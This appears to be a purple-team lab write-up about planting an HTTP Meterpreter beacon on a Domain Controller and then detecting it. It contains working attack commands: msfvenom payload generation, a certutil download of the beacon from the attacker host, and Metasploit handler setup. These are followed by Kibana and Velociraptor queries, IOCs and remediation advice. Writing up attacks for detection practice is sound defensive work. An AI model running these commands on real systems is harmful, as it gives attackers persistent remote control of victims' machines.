# Phase 7 – Command & Control (HTTP Beacon)

**Target:** Domain Controller (DC) – `192.168.1.10`  
**Attacker:** Kali – `192.168.1.5`  
**Objective:** Establish persistent HTTP-based C2 channel that blends with web traffic and survives reboots.

---

## 1. Execution Summary

After obtaining a shell on the Domain Controller (Phase 6), the attacker generated an HTTP beacon payload, transferred it using `certutil.exe` (LOLBin), and executed it. The beacon called back to a Metasploit `reverse_http` handler on port 8081, providing a new Meterpreter session.

---

### Commands Used

#### On Kali – generate payload
```bash
msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.1.5 LPORT=8081 -f exe -o /tmp/beacon.exe
```

#### On Kali – HTTP server for transfer
```bash
cd /tmp && sudo python3 -m http.server 8080
```

#### On DC – download beacon
```cmd
certutil -urlcache -f http://192.168.1.5:8080/beacon.exe C:\Users\Public\beacon.exe
```

#### On Kali – Metasploit handler
```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_http
set LHOST 192.168.1.5
set LPORT 8081
set ExitOnSession false
exploit -j
```

#### On DC – execute beacon
```cmd
C:\Users\Public\beacon.exe
```

---

## Successful Output (Kali msfconsole)

```text
[*] Started reverse HTTP handler on 192.168.1.5:8081
[*] Meterpreter session 3 opened (192.168.1.5:8081 -> 192.168.1.10:49234)
```

---

## 2. Detection in Kibana

### 2.1 Network Connection (Sysmon Event ID 3)

```text
event.code: 3 AND destination.port: 8081 AND host.name: DC
```

**Observed:**
- Source IP: 192.168.1.10
- Destination IP: 192.168.1.5
- Port: 8081
- Process: beacon.exe

---

### 2.2 Process Creation (Event ID 4688)

```text
event.code: 4688 AND winlog.event_data.ProcessName: *beacon.exe*
```

---

### 2.3 Parent–Child Relationship (Critical Detection)

```text
winlog.event_id: 4688 AND winlog.event_data.ParentProcess: *certutil.exe*
```

**Process Tree:**
```text
cmd.exe → certutil.exe → beacon.exe
```

---

## 3. Velociraptor Hunting

### 3.1 Beacon Process Detection

```sql
SELECT Name, Pid, CommandLine, Exe, CreateTime
FROM hunt_results()
WHERE Exe =~ '(?i)beacon\\.exe'
```

---

### 3.2 Certutil Execution Chain

```sql
SELECT * FROM hunt_results()
WHERE System.EventID = 4688
AND EventData.ParentProcessName =~ '(?i)certutil'
```

---

### 3.3 File Detection

- Path: `C:\Users\Public\beacon.exe`

---

## 4. Indicators of Compromise (IOCs)

| Type | Value |
|------|------|
| Filename | beacon.exe |
| Path | C:\Users\Public\beacon.exe |
| Download method | certutil URL cache |
| C2 Server | 192.168.1.5:8081 |
| Parent Process | certutil.exe |

---

## 5. MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|--------|----------|----|
| Command & Control | HTTP Application Protocol | T1071.001 |
| Defense Evasion | Signed Binary Proxy Execution (certutil) | T1218 |
| Execution | User Execution | T1204 |

---

## 6. Remediation Recommendations

- Block `certutil.exe` outbound downloads
- Monitor HTTP traffic on non-standard ports (8080/8081)
- Enable Sysmon Event ID 3 (network monitoring)
- Correlate Event ID 4688 + 3 for beacon behavior
- Use Velociraptor proactive hunts for LOLBins

---